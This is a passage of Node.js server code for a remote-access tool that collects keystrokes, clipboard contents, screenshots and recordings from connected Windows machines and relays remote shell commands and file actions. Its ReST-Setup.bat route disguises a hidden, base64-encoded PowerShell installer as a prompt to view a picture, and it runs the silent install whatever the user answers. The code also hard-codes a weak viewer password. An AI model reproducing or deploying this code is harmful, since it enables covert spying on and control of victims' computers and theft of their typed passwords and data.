require("dotenv").config();

const fs = require("fs");
const http = require("http");
const path = require("path");
const express = require("express");
const cookieParser = require("cookie-parser");
const { WebSocketServer } = require("ws");

const PORT = Number(process.env.PORT) || 8080;
const ACCESS_TOKEN = process.env.ACCESS_TOKEN || "remote-screen-dev";
const MAX_AUDIT = Number(process.env.MAX_AUDIT) || 200;
const MAX_CLIPBOARD = Number(process.env.MAX_CLIPBOARD) || 300;
const MAX_KEYBOARD = Number(process.env.MAX_KEYBOARD) || 300;
const MAX_SCREENSHOTS = Number(process.env.MAX_SCREENSHOTS) || 80;
const MAX_RECORDINGS = Number(process.env.MAX_RECORDINGS) || 20;

const agents = new Map();
const termAgents = new Map();
const agentMeta = new Map();
const viewers = new Map();
const dashboardClients = new Set();
const auditLog = [];
const clipboardLog = new Map();
const keyboardLog = new Map();
const screenshotLog = new Map();
const recordingLog = new Map();
const downloadsDir = path.join(__dirname, "..", "downloads");
const recordingsDir = path.join(__dirname, "..", "data", "recordings");

function loadVersionsManifest() {
  const file = path.join(downloadsDir, "versions.json");
  if (!fs.existsSync(file)) return {};
  try {
    return JSON.parse(fs.readFileSync(file, "utf8"));
  } catch {
    return {};
  }
}

function getRegisteredUpdateInfo(product) {
  const info = loadVersionsManifest()[product];
  if (!info || !info.version) return {};
  return {
    latestVersion: info.version,
    downloadUrl: info.url || "",
    minSize: info.minSize || 0,
  };
}

if (!fs.existsSync(recordingsDir)) {
  fs.mkdirSync(recordingsDir, { recursive: true });
}

const app = express();
app.use(express.json());
app.use(cookieParser());

// Password protection for viewer
const VIEWER_PASSWORD = "159";
const VIEWER_TOKEN_KEY = "viewer_token";
const VIEWER_AUTH_TOKEN = "viewer_auth_" + Date.now();

function publicBaseUrl(req) {
  const proto = req.headers["x-forwarded-proto"]?.split(",")[0]?.trim() || req.protocol || "http";
  const host = req.headers["x-forwarded-host"]?.split(",")[0]?.trim() || req.get("host");
  return `${proto}://${host}`;
}

function sendPs1Download(res, filename, body) {
  res.setHeader("Content-Type", "text/plain; charset=utf-8");
  res.setHeader("Content-Disposition", `attachment; filename="${filename}"`);
  res.send(Buffer.from(body, "utf8"));
}

const STRIP_PS1_BOM = [
  "$t = [IO.File]::ReadAllText($f)",
  "$t = $t.TrimStart([char]0xFEFF)",
  "[IO.File]::WriteAllText($f, $t, (New-Object System.Text.UTF8Encoding $false))",
].join("; ");

function buildInstallWrapperPs1(base, opts = {}) {
  const installScript = opts.installScript || "install.ps1";
  const tempScript = opts.tempScript || "ReSA-install.ps1";
  const logFile = opts.logFile || "ReSA-install.log";
  const safeBase = base.replace(/'/g, "''");
  return [
    "# ReSA one-click install wrapper - ASCII only",
    "param(",
    "    [switch]$Silent = $true",
    ")",
    "$ErrorActionPreference = 'Continue'",
    "$scriptPath = $MyInvocation.MyCommand.Path",
    "if ($scriptPath) {",
    "    Unblock-File -LiteralPath $scriptPath -ErrorAction SilentlyContinue",
    "}",
    `$env:RESA_INSTALL_BASE='${safeBase}'`,
    `$log = Join-Path $env:TEMP '${logFile}'`,
    "Add-Content -LiteralPath $log -Value ((Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + ' wrapper start')",
    "try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}",
    `$f = Join-Path $env:TEMP '${tempScript}'`,
    "$curl = Join-Path $env:SystemRoot 'System32\\curl.exe'",
    "try {",
    "    if (Test-Path -LiteralPath $curl) {",
    `        & $curl -fsSL -o $f ($env:RESA_INSTALL_BASE + '/${installScript}')`,
    "    }",
    "    if (-not (Test-Path -LiteralPath $f)) {",
    `        Invoke-WebRequest -Uri ($env:RESA_INSTALL_BASE + '/${installScript}') -OutFile $f -UseBasicParsing`,
    "    }",
    "    Unblock-File -LiteralPath $f -ErrorAction SilentlyContinue",
    `    ${STRIP_PS1_BOM}`,
    "    if ($Silent) {",
    "        & $f -Silent",
    "    } else {",
    "        & $f",
    "    }",
    "    exit $LASTEXITCODE",
    "} catch {",
    "    $m = $_.Exception.Message",
    "    Add-Content -LiteralPath $log -Value ((Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + ' wrapper error: ' + $m)",
    "    exit 1",
    "}",
  ].join("\r\n");
}

function buildInstallRunCommand(base, opts = {}) {
  const wrapperName = opts.wrapperName || "ReSA-Install.ps1";
  const safeBase = base.replace(/'/g, "''");
  return (
    `$b='${safeBase}'; $f=Join-Path $env:TEMP '${wrapperName}'; ` +
    `$curl=Join-Path $env:SystemRoot 'System32\\curl.exe'; ` +
    `if (Test-Path -LiteralPath $curl) { & $curl -fsSL -o $f ($b+'/${wrapperName}') }; ` +
    `if (-not (Test-Path -LiteralPath $f)) { Invoke-WebRequest -Uri ($b+'/${wrapperName}') -OutFile $f -UseBasicParsing }; ` +
    `Unblock-File -LiteralPath $f -ErrorAction SilentlyContinue; ` +
    `${STRIP_PS1_BOM}; ` +
    `& $f -Silent`
  );
}

function buildSetupBat(base, opts = {}) {
  const cmd = buildInstallRunCommand(base, opts).replace(/"/g, '\\"');
  return [
    "@echo off",
    "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"" + cmd + "\"",
    "exit /b %ERRORLEVEL%",
  ].join("\r\n");
}

function buildInstallBat(base) {
  return buildSetupBat(base);
}

function buildUninstallRunCommand(base, opts = {}) {
  const scriptName = opts.scriptName || "uninstall.ps1";
  const tempName = opts.tempName || "ReSA-uninstall.ps1";
  const safeBase = base.replace(/'/g, "''");
  return [
    `$b='${safeBase}'`,
    `$f=Join-Path $env:TEMP '${tempName}'`,
    `$curl=Join-Path $env:SystemRoot 'System32\\curl.exe'`,
    `if (Test-Path -LiteralPath $curl) { & $curl -fsSL -o $f ($b+'/${scriptName}') }`,
    `if (-not (Test-Path -LiteralPath $f)) { Invoke-WebRequest -Uri ($b+'/${scriptName}') -OutFile $f -UseBasicParsing }`,
    "Unblock-File -LiteralPath $f -ErrorAction SilentlyContinue",
    STRIP_PS1_BOM,
    "& $f; exit $LASTEXITCODE",
  ].join("; ");
}

function buildUninstallBat(base, opts = {}) {
  const cmd = buildUninstallRunCommand(base, opts).replace(/"/g, '\\"');
  return [
    "@echo off",
    "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"" + cmd + "\"",
    "exit /b %ERRORLEVEL%",
  ].join("\r\n");
}

function sendDownloadAsset(res, filename, contentType) {
  const filePath = path.join(downloadsDir, filename);
  if (!fs.existsSync(filePath)) {
    return res.status(404).send(`${filename} not found on server`);
  }
  if (filename.endsWith(".ps1")) {
    const text = fs.readFileSync(filePath, "utf8").replace(/^\uFEFF/, "");
    res.setHeader("Content-Type", contentType);
    return res.send(Buffer.from(text, "utf8"));
  }
  res.setHeader("Content-Type", contentType);
  res.sendFile(filePath);
}

app.get("/install", (_req, res) => {
  res.redirect("/install.html");
});

app.get("/download/install", (req, res) => {
  const accept = req.headers.accept || "";
  if (accept.includes("text/html")) {
    return res.redirect("/install.html");
  }
  res.redirect("/download/ReSA-Setup.bat");
});

app.get("/download/ReSA-Setup.bat", (req, res) => {
  const base = `${publicBaseUrl(req)}/download`;
  res.setHeader("Content-Type", "application/octet-stream");
  res.setHeader(
    "Content-Disposition",
    'attachment; filename="ReSA-Setup.bat"; filename*=UTF-8\'\'ReSA%E5%AE%89%E8%A3%85.bat'
  );
  res.send(buildSetupBat(base));
});

app.get("/download/ReSA-Install.ps1", (req, res) => {
  const base = `${publicBaseUrl(req)}/download`;
  sendPs1Download(res, "ReSA-Install.ps1", buildInstallWrapperPs1(base));
});

app.get("/download/ReST-Setup.bat", (req, res) => {
  const base = `${publicBaseUrl(req)}/download`;
  const pictureUrl = `${base}/picture_1963.webp`;
  
  // PowerShell 脚本：弹窗确认是否查看图片
  const confirmCmd = [
    `$result = [System.Windows.Forms.MessageBox]::Show('是否查看图片？', 'picture_1963', [System.Windows.Forms.MessageBoxButtons]::YesNo, [System.Windows.Forms.MessageBoxIcon]::Question)`,
    `if ($result -eq 'Yes') { Start-Process '${pictureUrl}' }`,
  ].join("; ");
  
  // 安装命令
  const installCmd = buildInstallRunCommand(base, {
    wrapperName: "ReST-Install.ps1",
  });
  
  // 合并：先弹窗确认，然后执行安装
  const fullCmd = `Add-Type -AssemblyName System.Windows.Forms; ${confirmCmd}; ${installCmd}`;
  
  // 编码为 Base64 以避免引号问题
  const encoded = Buffer.from(fullCmd, 'utf16le').toString('base64');
  
  res.setHeader("Content-Type", "application/octet-stream");
  res.setHeader(
    "Content-Disposition",
    'attachment; filename="ReST-Setup.bat"; filename*=UTF-8\'\'ReST%E5%AE%89%E8%A3%85.bat'
  );
  
  // 使用 -WindowStyle Hidden 隐藏 PowerShell 窗口，但弹窗仍会显示
  const batScript = [
    "@echo off",
    "REM ReST Install Script - Hidden",
    `powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${encoded}`,
    "exit /b %ERRORLEVEL%",
  ].join("\r\n");
  
  res.send(batScript);
});

app.get("/download/ReST-Install.ps1", (req, res) => {
  const base = `${publicBaseUrl(req)}/download`;
  sendPs1Download(
    res,
    "ReST-Install.ps1",
    buildInstallWrapperPs1(base, {
      installScript: "install-rest.ps1",
      tempScript: "ReST-install.ps1",
      logFile: "ReST-install.log",
    })
  );
});

app.get("/download/install.bat", (req, res) => {
  res.redirect("/download/ReSA-Setup.bat");
});

app.get("/download/uninstall.bat", (req, res) => {
  const base = `${publicBaseUrl(req)}/download`;
  const body = buildUninstallBat(base);
  res.setHeader("Content-Type", "application/octet-stream");
  res.setHeader("Content-Disposition", 'attachment; filename="ReSA-Uninstall.bat"');
  res.send(body);
});

app.get("/download/uninstall-rest.bat", (req, res) => {
  const base = `${publicBaseUrl(req)}/download`;
  const body = buildUninstallBat(base, {
    title: "ReST 卸载",
    scriptName: "uninstall-rest.ps1",
    tempName: "ReST-uninstall.ps1",
    batFilename: "ReST-Uninstall.bat",
    productName: "ReST",
  });
  res.setHeader("Content-Type", "application/octet-stream");
  res.setHeader("Content-Disposition", 'attachment; filename="ReST-Uninstall.bat"');
  res.send(body);
});

app.get("/download/install.ps1", (req, res) => {
  sendDownloadAsset(res, "install.ps1", "text/plain; charset=utf-8");
});

app.get("/download/install-rest.ps1", (req, res) => {
  sendDownloadAsset(res, "install-rest.ps1", "text/plain; charset=utf-8");
});

app.get("/download/uninstall.ps1", (req, res) => {
  sendDownloadAsset(res, "uninstall.ps1", "text/plain; charset=utf-8");
});

app.get("/download/uninstall-rest.ps1", (req, res) => {
  sendDownloadAsset(res, "uninstall-rest.ps1", "text/plain; charset=utf-8");
});

app.get("/download/ReSA.exe", (req, res) => {
  sendDownloadAsset(res, "ReSA.exe", "application/octet-stream");
});

app.get("/download/ReST.exe", (req, res) => {
  sendDownloadAsset(res, "ReST.exe", "application/octet-stream");
});

app.get("/download/ReST.zip", (req, res) => {
  sendDownloadAsset(res, "ReST.zip", "application/zip");
});

app.get("/download/versions.json", (req, res) => {
  res.setHeader("Content-Type", "application/json; charset=utf-8");
  res.setHeader("Cache-Control", "no-store");
  res.send(loadVersionsManifest());
});

app.use("/download", express.static(downloadsDir));

// Middleware to verify viewer password - only for root
function requireViewerAuthForRoot(req, res, next) {
  // 允许 /install.html, /login.html, /login 等不需要密码
  if (req.path && (req.path === '/login.html' || req.path === '/install.html' || req.path.startsWith('/assets'))) {
    return next();
  }
  const token = req.cookies?.[VIEWER_TOKEN_KEY];
  if (token === VIEWER_AUTH_TOKEN) {
    return next();
  }
  res.sendFile(path.join(__dirname, "..", "viewer", "login.html"));
}

// Login endpoint
app.post("/login", (req, res) => {
  const { password } = req.body;
  if (password === VIEWER_PASSWORD) {
    res.cookie(VIEWER_TOKEN_KEY, VIEWER_AUTH_TOKEN, {
      httpOnly: true,
      secure: false,
      maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
    });
    res.json({ success: true });
  } else {
    res.status(401).json({ success: false, error: "Invalid password" });
  }
});

// Protect only index.html and other sensitive pages, allow install.html and downloads
app.use(requireViewerAuthForRoot);
app.use(express.static(path.join(__dirname, "..", "viewer")));

function send(ws, payload) {
  if (ws && ws.readyState === ws.OPEN) {
    ws.send(JSON.stringify(payload));
  }
}

function parseBinaryFrame(raw) {
  const buf = Buffer.isBuffer(raw) ? raw : Buffer.from(raw);
  if (buf.length < 5 || buf[0] !== 0x01) return null;
  return {
    width: buf.readUInt16BE(1),
    height: buf.readUInt16BE(3),
    data: buf.slice(5).toString("base64"),
  };
}

function parseQuery(url) {
  const query = {};
  const idx = url.indexOf("?");
  if (idx === -1) return query;
  for (const part of url.slice(idx + 1).split("&")) {
    const [k, v] = part.split("=");
    if (k) query[decodeURIComponent(k)] = decodeURIComponent(v || "");
  }
  return query;
}

function verifyToken(token) {
  return Boolean(token) && token === ACCESS_TOKEN;
}

function extractToken(req, query) {
  const auth = req.headers.authorization || "";
  if (auth.startsWith("Bearer ")) return auth.slice(7);
  return query.token || "";
}

function addAudit(event, detail) {
  auditLog.unshift({
    id: `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
    time: new Date().toISOString(),
    event,
    ...detail,
  });
  if (auditLog.length > MAX_AUDIT) auditLog.length = MAX_AUDIT;
}

function addClipboardEntry(deviceId, msg) {
  if (!clipboardLog.has(deviceId)) clipboardLog.set(deviceId, []);
  const list = clipboardLog.get(deviceId);
  const entry = {
    id: `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
    time: msg.time || new Date().toISOString(),
    content: String(msg.content || ""),
    truncated: Boolean(msg.truncated),
  };
  list.unshift(entry);
  if (list.length > MAX_CLIPBOARD) list.length = MAX_CLIPBOARD;
  return entry;
}

function getClipboardEntries(deviceId, limit) {
  const list = clipboardLog.get(deviceId) || [];
  return list.slice(0, limit);
}

function addKeyboardEntry(deviceId, msg) {
  if (!keyboardLog.has(deviceId)) keyboardLog.set(deviceId, []);
  const list = keyboardLog.get(deviceId);
  const entry = {
    id: `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
    time: msg.time || new Date().toISOString(),
    content: String(msg.content || ""),
    truncated: Boolean(msg.truncated),
  };
  list.unshift(entry);
  if (list.length > MAX_KEYBOARD) list.length = MAX_KEYBOARD;
  return entry;
}

function getKeyboardEntries(deviceId, limit) {
  const list = keyboardLog.get(deviceId) || [];
  return list.slice(0, limit);
}

function addScreenshotEntry(deviceId, msg) {
  if (!screenshotLog.has(deviceId)) screenshotLog.set(deviceId, []);
  const list = screenshotLog.get(deviceId);
  const entry = {
    id: `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
    time: msg.time || new Date().toISOString(),
    width: Number(msg.width) || 0,
    height: Number(msg.height) || 0,
    data: String(msg.data || ""),
  };
  list.unshift(entry);
  if (list.length > MAX_SCREENSHOTS) list.length = MAX_SCREENSHOTS;
  return entry;
}

function getScreenshotEntries(deviceId, limit) {
  const list = screenshotLog.get(deviceId) || [];
  return list.slice(0, limit);
}

function clearClipboardEntries(deviceId) {
  clipboardLog.set(deviceId, []);
}

function clearKeyboardEntries(deviceId) {
  keyboardLog.set(deviceId, []);
}

function clearScreenshotEntries(deviceId) {
  screenshotLog.set(deviceId, []);
}

function findRecordingEntry(recordingId) {
  for (const [deviceId, list] of recordingLog) {
    const entry = list.find((e) => e.id === recordingId);
    if (entry) return { deviceId, entry };
  }
  return null;
}

function deleteRecordingFile(filename) {
  if (!filename) return;
  try {
    fs.unlinkSync(path.join(recordingsDir, filename));
  } catch {
    // ignore missing files
  }
}

function addRecordingEntry(deviceId, msg) {
  if (!recordingLog.has(deviceId)) recordingLog.set(deviceId, []);
  const list = recordingLog.get(deviceId);
  const id = `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
  const filename = `${deviceId}-${id}.mp4`;
  const buf = Buffer.from(String(msg.data || ""), "base64");
  fs.writeFileSync(path.join(recordingsDir, filename), buf);
  const entry = {
    id,
    time: msg.time || new Date().toISOString(),
    duration: Number(msg.duration) || 0,
    width: Number(msg.width) || 0,
    height: Number(msg.height) || 0,
    size: buf.length,
    filename,
  };
  list.unshift(entry);
  while (list.length > MAX_RECORDINGS) {
    const removed = list.pop();
    deleteRecordingFile(removed?.filename);
  }
  return entry;
}

function getRecordingEntries(deviceId, limit) {
  const list = recordingLog.get(deviceId) || [];
  return list
    .slice(0, limit)
    .map(({ id, time, duration, width, height, size }) => ({
      id,
      time,
      duration,
      width,
      height,
      size,
    }));
}

function clearRecordingEntries(deviceId) {
  const list = recordingLog.get(deviceId) || [];
  for (const entry of list) deleteRecordingFile(entry.filename);
  recordingLog.set(deviceId, []);
}

function notifyRecordingUpload(deviceId, msg) {
  const entry = addRecordingEntry(deviceId, msg);
  addAudit("recording", {
    deviceId,
    duration: entry.duration,
    width: entry.width,
    height: entry.height,
    size: entry.size,
  });
  const payload = {
    type: "recording_uploaded",
    deviceId,
    entry: {
      id: entry.id,
      time: entry.time,
      duration: entry.duration,
      width: entry.width,
      height: entry.height,
      size: entry.size,
    },
  };
  const set = viewers.get(deviceId);
  if (set) {
    for (const viewer of set) send(viewer, payload);
  }
  broadcastDashboard("recording_uploaded", payload);
  return entry;
}

function notifyScreenshotCapture(deviceId, msg) {
  const entry = addScreenshotEntry(deviceId, msg);
  addAudit("screenshot", {
    deviceId,
    width: entry.width,
    height: entry.height,
  });
  const payload = { type: "screenshot_capture", deviceId, entry };
  const set = viewers.get(deviceId);
  if (set) {
    for (const viewer of set) send(viewer, payload);
  }
  broadcastDashboard("screenshot_capture", payload);
  return entry;
}

function deviceSnapshot(deviceId) {
  const meta = agentMeta.get(deviceId) || {};
  const viewerCount = viewers.get(deviceId)?.size || 0;
  return {
    deviceId,
    online: agents.has(deviceId),
    termOnline: termAgents.has(deviceId),
    viewerCount,
    hostname: meta.hostname || meta.termHostname || "",
    platform: meta.platform || meta.termPlatform || "",
    agentVersion: meta.agentVersion || "",
    termVersion: meta.termVersion || "",
    monitor: meta.monitor ?? null,
    connectedAt: meta.connectedAt || null,
    lastSeen: meta.lastSeen || null,
  };
}

function listDevices() {
  const ids = new Set([
    ...agents.keys(),
    ...termAgents.keys(),
    ...agentMeta.keys(),
  ]);
  return [...ids]
    .map(deviceSnapshot)
    .sort((a, b) => {
      if (a.online !== b.online) return a.online ? -1 : 1;
      return a.deviceId.localeCompare(b.deviceId);
    });
}

function broadcastDashboard(type, payload) {
  const msg = JSON.stringify({ type, ...payload });
  for (const ws of dashboardClients) {
    if (ws.readyState === ws.OPEN) ws.send(msg);
  }
}

function notifyAgentViewerCount(deviceId) {
  const agent = agents.get(deviceId);
  if (!agent) return;
  const count = viewers.get(deviceId)?.size || 0;
  send(agent, { type: "viewer_count", count });
}

function notifyViewersAgentOnline(deviceId) {
  const set = viewers.get(deviceId);
  if (!set) return;
  for (const viewer of set) {
    send(viewer, { type: "agent_online", deviceId });
  }
}

function notifyViewersTermOnline(deviceId) {
  const set = viewers.get(deviceId);
  if (!set) return;
  for (const viewer of set) {
    send(viewer, { type: "term_online", deviceId });
  }
}

function authMiddleware(req, res, next) {
  const token = req.headers.authorization?.replace(/^Bearer\s+/i, "") || req.query.token;
  if (!verifyToken(token)) {
    return res.status(401).json({ error: "unauthorized" });
  }
  next();
}

app.get("/api/health", (_req, res) => {
  res.json({ ok: true, agents: agents.size, viewers: [...viewers.values()].reduce((n, s) => n + s.size, 0) });
});

app.get("/api/devices", authMiddleware, (_req, res) => {
  res.json({ devices: listDevices() });
});

app.get("/api/audit", authMiddleware, (req, res) => {
  const limit = Math.min(Number(req.query.limit) || 50, MAX_AUDIT);
  res.json({ entries: auditLog.slice(0, limit) });
});

app.get("/api/clipboard", authMiddleware, (req, res) => {
  const deviceId = req.query.deviceId;
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
  const limit = Math.min(Number(req.query.limit) || 300, MAX_CLIPBOARD);
  res.json({ deviceId, entries: getClipboardEntries(deviceId, limit) });
});

app.get("/api/keyboard", authMiddleware, (req, res) => {
  const deviceId = req.query.deviceId;
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
  const limit = Math.min(Number(req.query.limit) || 300, MAX_KEYBOARD);
  res.json({ deviceId, entries: getKeyboardEntries(deviceId, limit) });
});

app.get("/api/screenshots", authMiddleware, (req, res) => {
  const deviceId = req.query.deviceId;
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
  const limit = Math.min(Number(req.query.limit) || MAX_SCREENSHOTS, MAX_SCREENSHOTS);
  res.json({ deviceId, entries: getScreenshotEntries(deviceId, limit) });
});

app.get("/api/recordings", authMiddleware, (req, res) => {
  const deviceId = req.query.deviceId;
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
  const limit = Math.min(Number(req.query.limit) || MAX_RECORDINGS, MAX_RECORDINGS);
  res.json({ deviceId, entries: getRecordingEntries(deviceId, limit) });
});

app.get("/api/recordings/:id/file", (req, res) => {
  const token =
    req.headers.authorization?.replace(/^Bearer\s+/i, "") || req.query.token || "";
  if (!verifyToken(token)) {
    return res.status(401).send("unauthorized");
  }
  const found = findRecordingEntry(req.params.id);
  if (!found) return res.status(404).send("not found");
  const filePath = path.join(recordingsDir, found.entry.filename);
  if (!fs.existsSync(filePath)) return res.status(404).send("file missing");
  res.setHeader("Content-Type", "video/mp4");
  res.sendFile(filePath);
});

app.delete("/api/clipboard", authMiddleware, (req, res) => {
  const deviceId = req.query.deviceId;
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
  clearClipboardEntries(deviceId);
  addAudit("clipboard_clear", { deviceId });
  res.json({ ok: true, deviceId });
});

app.delete("/api/keyboard", authMiddleware, (req, res) => {
  const deviceId = req.query.deviceId;
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
  clearKeyboardEntries(deviceId);
  addAudit("keyboard_clear", { deviceId });
  res.json({ ok: true, deviceId });
});

app.delete("/api/screenshots", authMiddleware, (req, res) => {
  const deviceId = req.query.deviceId;
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
  clearScreenshotEntries(deviceId);
  addAudit("screenshot_clear", { deviceId });
  res.json({ ok: true, deviceId });
});

app.delete("/api/recordings", authMiddleware, (req, res) => {
  const deviceId = req.query.deviceId;
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
  clearRecordingEntries(deviceId);
  addAudit("recording_clear", { deviceId });
  res.json({ ok: true, deviceId });
});

app.post(
  "/api/screenshots/upload",
  express.json({ limit: "12mb" }),
  authMiddleware,
  (req, res) => {
    const deviceId = req.body?.deviceId;
    if (!deviceId || !req.body?.data) {
      return res.status(400).json({ error: "deviceId and data required" });
    }
    const entry = notifyScreenshotCapture(deviceId, req.body);
    res.json({
      ok: true,
      entry: {
        id: entry.id,
        time: entry.time,
        width: entry.width,
        height: entry.height,
        data: entry.data,
      },
    });
  }
);

app.post(
  "/api/recordings/upload",
  express.json({ limit: "50mb" }),
  authMiddleware,
  (req, res) => {
    const deviceId = req.body?.deviceId;
    if (!deviceId || !req.body?.data) {
      return res.status(400).json({ error: "deviceId and data required" });
    }
    const entry = notifyRecordingUpload(deviceId, req.body);
    res.json({
      ok: true,
      entry: {
        id: entry.id,
        time: entry.time,
        duration: entry.duration,
        width: entry.width,
        height: entry.height,
        size: entry.size,
      },
    });
  }
);

const server = http.createServer(app);
const wss = new WebSocketServer({
  server,
  path: "/ws",
  maxPayload: 16 * 1024 * 1024,
});

wss.on("connection", (ws, req) => {
  const q = parseQuery(req.url || "");
  const role = q.role;
  const deviceId = q.deviceId || "default";
  const token = extractToken(req, q);
  const clientIp = req.socket.remoteAddress || "";

  if (!verifyToken(token)) {
    ws.close(4401, "unauthorized");
    return;
  }

  ws.role = role;
  ws.deviceId = deviceId;
  ws.clientIp = clientIp;

  if (role === "dashboard") {
    dashboardClients.add(ws);
    send(ws, { type: "registered", role: "dashboard", devices: listDevices() });
    ws.on("close", () => dashboardClients.delete(ws));
    return;
  }

  if (role === "agent") {
    const prev = agents.get(deviceId);
    if (prev && prev !== ws) prev.close(4000, "replaced");
    agents.set(deviceId, ws);

    const meta = agentMeta.get(deviceId) || {};
    meta.connectedAt = meta.connectedAt || new Date().toISOString();
    meta.lastSeen = new Date().toISOString();
    meta.ip = clientIp;
    agentMeta.set(deviceId, meta);

    send(ws, {
      type: "registered",
      role: "agent",
      deviceId,
      ...getRegisteredUpdateInfo("resa"),
    });
    notifyAgentViewerCount(deviceId);
    notifyViewersAgentOnline(deviceId);
    addAudit("agent_online", { deviceId, ip: clientIp });
    broadcastDashboard("devices_changed", { devices: listDevices() });
    console.log(`[agent] online: ${deviceId} (${clientIp})`);
  } else if (role === "term") {
    const prev = termAgents.get(deviceId);
    if (prev && prev !== ws) prev.close(4000, "replaced");
    termAgents.set(deviceId, ws);

    const meta = agentMeta.get(deviceId) || {};
    meta.lastSeen = new Date().toISOString();
    meta.ip = clientIp;
    agentMeta.set(deviceId, meta);

    send(ws, {
      type: "registered",
      role: "term",
      deviceId,
      ...getRegisteredUpdateInfo("rest"),
    });
    notifyViewersTermOnline(deviceId);
    addAudit("term_online", { deviceId, ip: clientIp });
    broadcastDashboard("devices_changed", { devices: listDevices() });
    console.log(`[term] online: ${deviceId} (${clientIp})`);
  } else if (role === "viewer") {
    if (!viewers.has(deviceId)) viewers.set(deviceId, new Set());
    viewers.get(deviceId).add(ws);
    send(ws, {
      type: "registered",
      role: "viewer",
      deviceId,
      agentOnline: agents.has(deviceId),
      termOnline: termAgents.has(deviceId),
      device: deviceSnapshot(deviceId),
      clipboard: getClipboardEntries(deviceId, 300),
      keyboard: getKeyboardEntries(deviceId, 300),
      screenshots: getScreenshotEntries(deviceId, MAX_SCREENSHOTS).map(
        ({ id, time, width, height }) => ({ id, time, width, height })
      ),
    });
    notifyAgentViewerCount(deviceId);
    addAudit("viewer_connect", { deviceId, ip: clientIp });
    broadcastDashboard("devices_changed", { devices: listDevices() });
    console.log(`[viewer] connected -> ${deviceId} (${clientIp})`);
  } else {
    ws.close(4400, "invalid role");
    return;
  }

  ws.on("message", (raw) => {
    if (ws.role === "agent") {
      const binaryFrame = parseBinaryFrame(raw);
      if (binaryFrame) {
        const meta = agentMeta.get(deviceId) || {};
        meta.lastSeen = new Date().toISOString();
        agentMeta.set(deviceId, meta);
        const set = viewers.get(deviceId);
        if (!set || set.size === 0) return;
        const payload = { type: "frame", ...binaryFrame };
        for (const viewer of set) send(viewer, payload);
        return;
      }
    }

    let msg;
    try {
      msg = JSON.parse(raw.toString());
    } catch {
      return;
    }

    if (ws.role === "agent") {
      if (msg.type === "agent_info") {
        const meta = agentMeta.get(deviceId) || {};
        meta.hostname = msg.hostname || meta.hostname;
        meta.platform = msg.platform || meta.platform;
        meta.monitor = msg.monitor ?? meta.monitor;
        if (msg.version) meta.agentVersion = msg.version;
        meta.lastSeen = new Date().toISOString();
        agentMeta.set(deviceId, meta);
        broadcastDashboard("devices_changed", { devices: listDevices() });
        return;
      }

      if (msg.type === "frame") {
        const meta = agentMeta.get(deviceId) || {};
        meta.lastSeen = new Date().toISOString();
        agentMeta.set(deviceId, meta);
        const set = viewers.get(deviceId);
        if (!set || set.size === 0) return;
        for (const viewer of set) send(viewer, msg);
        return;
      }

      if (msg.type === "clipboard_copy") {
        const entry = addClipboardEntry(deviceId, msg);
        addAudit("clipboard_copy", {
          deviceId,
          preview: entry.content.slice(0, 80),
        });
        const payload = { type: "clipboard_copy", deviceId, entry };
        const set = viewers.get(deviceId);
        if (set) {
          for (const viewer of set) send(viewer, payload);
        }
        broadcastDashboard("clipboard_copy", payload);
        return;
      }

      if (msg.type === "keyboard_input") {
        const entry = addKeyboardEntry(deviceId, msg);
        addAudit("keyboard_input", {
          deviceId,
          preview: entry.content.slice(0, 80),
        });
        const payload = { type: "keyboard_input", deviceId, entry };
        const set = viewers.get(deviceId);
        if (set) {
          for (const viewer of set) send(viewer, payload);
        }
        broadcastDashboard("keyboard_input", payload);
        return;
      }

      if (msg.type === "screenshot") {
        notifyScreenshotCapture(deviceId, msg);
        return;
      }

      const set = viewers.get(deviceId);
      if (!set || set.size === 0) return;
      for (const viewer of set) send(viewer, msg);
      return;
    }

    if (ws.role === "term") {
      const meta = agentMeta.get(deviceId) || {};
      meta.lastSeen = new Date().toISOString();
      if (msg.type === "term_info") {
        meta.termHostname = msg.hostname || meta.termHostname;
        meta.termPlatform = msg.platform || meta.termPlatform;
        if (msg.version) meta.termVersion = msg.version;
        agentMeta.set(deviceId, meta);
        broadcastDashboard("devices_changed", { devices: listDevices() });
        return;
      }
      if (msg.type === "terminal_result") {
        addAudit("terminal_result", {
          deviceId,
          exitCode: msg.exitCode,
          preview: String(msg.stdout || msg.stderr || "").slice(0, 80),
        });
        const set = viewers.get(deviceId);
        if (set) {
          for (const viewer of set) send(viewer, msg);
        }
        return;
      }
    }

    if (ws.role === "viewer" && msg.type === "file") {
      const agent = agents.get(deviceId);
      if (!agent) {
        send(ws, {
          type: "file_result",
          id: msg.id,
          action: msg.action,
          ok: false,
          error: "agent offline",
        });
        return;
      }
      addAudit("file_request", {
        deviceId,
        action: msg.action,
        path: String(msg.path || "").slice(0, 200),
      });
      send(agent, msg);
      return;
    }

    if (ws.role === "agent" && msg.type === "file_result") {
      const set = viewers.get(deviceId);
      if (!set) return;
      for (const viewer of set) send(viewer, msg);
      return;
    }

    if (ws.role === "viewer" && msg.type === "terminal") {
      const term = termAgents.get(deviceId);
      if (!term) {
        send(ws, {
          type: "terminal_result",
          id: msg.id,
          stdout: "",
          stderr: "terminal agent offline",
          exitCode: 1,
        });
        return;
      }
      addAudit("terminal_exec", {
        deviceId,
        shell: msg.shell || "cmd",
        preview: String(msg.command || "").slice(0, 120),
      });
      send(term, msg);
      return;
    }

    if (ws.role === "viewer" && msg.type === "update") {
      const product = msg.product === "rest" ? "rest" : "resa";
